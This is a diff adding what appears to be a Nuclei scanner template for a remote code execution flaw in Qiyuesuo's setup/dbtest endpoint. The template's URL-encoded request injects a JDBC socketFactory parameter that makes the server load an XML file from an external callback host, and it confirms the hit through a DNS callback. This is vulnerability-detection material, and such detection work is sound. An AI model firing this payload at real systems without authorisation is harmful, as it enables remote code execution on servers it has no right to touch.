@@ -1,0 +1,32 @@
+id: poc-yaml-qiyuesuo-dbtest-rce
+info:
+  name: Qiyuesuo DBTest Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: DNSLOG,rce
+
+variables:
+  reverse: '{{interactsh-url}}'
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/setup/dbtest?db=POSTGRESQL&host=localhost&port=5511&username=root&name=test%2F%3FsocketFactory%3Dorg%2Espringframework%2Econtext%2Esupport%2EClassPathXmlApplicationContext%26socketFactoryArg%3Dhttp%3A%2F%2F{{reverse}}%2F1%2Exml"
+      - "{{BaseURL}}/api/setup/dbtest?db=POSTGRESQL&host=localhost&port=5511&username=root&name=test%2F%3FsocketFactory%3Dorg%2Espringframework%2Econtext%2Esupport%2EClassPathXmlApplicationContext%26socketFactoryArg%3Dhttp%3A%2F%2F{{reverse}}%2F1%2Exml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"code":100'
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
